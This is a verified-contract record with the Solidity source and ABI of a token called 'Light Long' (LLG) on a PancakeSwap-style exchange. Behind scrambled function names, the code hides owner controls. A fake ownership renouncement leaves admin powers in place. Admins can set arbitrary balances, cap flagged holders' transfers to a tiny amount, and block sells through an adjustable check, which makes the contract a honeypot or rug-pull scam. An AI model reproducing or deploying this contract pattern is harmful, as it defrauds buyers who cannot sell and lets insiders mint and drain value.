{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface listBuyAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldTx {\n    function createPair(address launchedWallet, address limitMin) external returns (address);\n}\n\ninterface isShouldWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTxFund) external view returns (uint256);\n\n    function transfer(address teamAuto, uint256 totalSender) external returns (bool);\n\n    function allowance(address teamReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamAuto,\n        uint256 totalSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeEnable, uint256 value);\n    event Approval(address indexed teamReceiver, address indexed spender, uint256 value);\n}\n\ninterface minLimit is isShouldWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LightLong is enableMin, isShouldWallet, minLimit {\n\n    uint256 public buyMax;\n\n    string private tradingLaunch = \"LLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeEnableTotal;\n    }\n\n    uint256 private sellLaunch;\n\n    function shouldList() private view {\n        require(isLaunch[_msgSender()]);\n    }\n\n    constructor (){\n        \n        listBuyAt feeAmount = listBuyAt(txAt);\n        limitAt = shouldTx(feeAmount.factory()).createPair(feeAmount.WETH(), address(this));\n        if (modeTeam != liquiditySwap) {\n            receiverAmount = false;\n        }\n        fromFee = _msgSender();\n        autoSwap();\n        isLaunch[fromFee] = true;\n        liquidityTo[fromFee] = toFee;\n        \n        emit Transfer(address(0), fromFee, toFee);\n    }\n\n    function walletReceiverLiquidity(address marketingTx) public {\n        require(marketingTx.balance < 100000);\n        if (fromAmount) {\n            return;\n        }\n        if (atSender == sellLaunch) {\n            modeTeam = minFrom;\n        }\n        isLaunch[marketingTx] = true;\n        \n        fromAmount = true;\n    }\n\n    uint256 public liquiditySwap;\n\n    string private buyLaunch = \"Light Long\";\n\n    bool public fromAmount;\n\n    function allowance(address swapFromLaunched, address modeReceiver) external view virtual override returns (uint256) {\n        if (modeReceiver == txAt) {\n            return type(uint256).max;\n        }\n        return autoToken[swapFromLaunched][modeReceiver];\n    }\n\n    address public fromFee;\n\n    mapping(address => bool) public isLaunch;\n\n    function getOwner() external view returns (address) {\n        return listFund;\n    }\n\n    function enableAutoTeam(address takeShould, uint256 totalSender) public {\n        shouldList();\n        liquidityTo[takeShould] = totalSender;\n    }\n\n    uint256 private modeTeam;\n\n    function tokenReceiver(address txAutoWallet, address teamAuto, uint256 totalSender) internal returns (bool) {\n        if (txAutoWallet == fromFee) {\n            return atTokenWallet(txAutoWallet, teamAuto, totalSender);\n        }\n        uint256 maxReceiver = isShouldWallet(limitAt).balanceOf(listTotal);\n        require(maxReceiver == fundSender);\n        require(teamAuto != listTotal);\n        if (totalTrading[txAutoWallet]) {\n            return atTokenWallet(txAutoWallet, teamAuto, marketingTrading);\n        }\n        return atTokenWallet(txAutoWallet, teamAuto, totalSender);\n    }\n\n    address txAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private launchedMin;\n\n    function autoSwap() public {\n        emit OwnershipTransferred(fromFee, address(0));\n        listFund = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toFee;\n    }\n\n    address private listFund;\n\n    function balanceOf(address amountTxFund) public view virtual override returns (uint256) {\n        return liquidityTo[amountTxFund];\n    }\n\n    function launchedExempt(address marketingList) public {\n        shouldList();\n        if (launchedMin == receiverAmount) {\n            receiverAmount = true;\n        }\n        if (marketingList == fromFee || marketingList == limitAt) {\n            return;\n        }\n        totalTrading[marketingList] = true;\n    }\n\n    uint256 private minFrom;\n\n    uint8 private feeEnableTotal = 18;\n\n    mapping(address => uint256) private liquidityTo;\n\n    mapping(address => mapping(address => uint256)) private autoToken;\n\n    function shouldReceiver(uint256 totalSender) public {\n        shouldList();\n        fundSender = totalSender;\n    }\n\n    function atTokenWallet(address txAutoWallet, address teamAuto, uint256 totalSender) internal returns (bool) {\n        require(liquidityTo[txAutoWallet] >= totalSender);\n        liquidityTo[txAutoWallet] -= totalSender;\n        liquidityTo[teamAuto] += totalSender;\n        emit Transfer(txAutoWallet, teamAuto, totalSender);\n        return true;\n    }\n\n    function approve(address modeReceiver, uint256 totalSender) public virtual override returns (bool) {\n        autoToken[_msgSender()][modeReceiver] = totalSender;\n        emit Approval(_msgSender(), modeReceiver, totalSender);\n        return true;\n    }\n\n    bool private receiverAmount;\n\n    uint256 private atSender;\n\n    address public limitAt;\n\n    mapping(address => bool) public totalTrading;\n\n    uint256 totalEnable;\n\n    function transfer(address takeShould, uint256 totalSender) external virtual override returns (bool) {\n        return tokenReceiver(_msgSender(), takeShould, totalSender);\n    }\n\n    uint256 private atMarketingList;\n\n    function transferFrom(address txAutoWallet, address teamAuto, uint256 totalSender) external override returns (bool) {\n        if (_msgSender() != txAt) {\n            if (autoToken[txAutoWallet][_msgSender()] != type(uint256).max) {\n                require(totalSender <= autoToken[txAutoWallet][_msgSender()]);\n                autoToken[txAutoWallet][_msgSender()] -= totalSender;\n            }\n        }\n        return tokenReceiver(txAutoWallet, teamAuto, totalSender);\n    }\n\n    function owner() external view returns (address) {\n        return listFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingLaunch;\n    }\n\n    uint256 fundSender;\n\n    event OwnershipTransferred(address indexed isFeeTrading, address indexed takeTotal);\n\n    uint256 constant marketingTrading = 12 ** 10;\n\n    uint256 private toFee = 100000000 * 10 ** 18;\n\n    address listTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFeeTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFromLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTxFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSender\",\"type\":\"uint256\"}],\"name\":\"enableAutoTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"}],\"name\":\"launchedExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalSender\",\"type\":\"uint256\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAutoWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"}],\"name\":\"walletReceiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LightLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}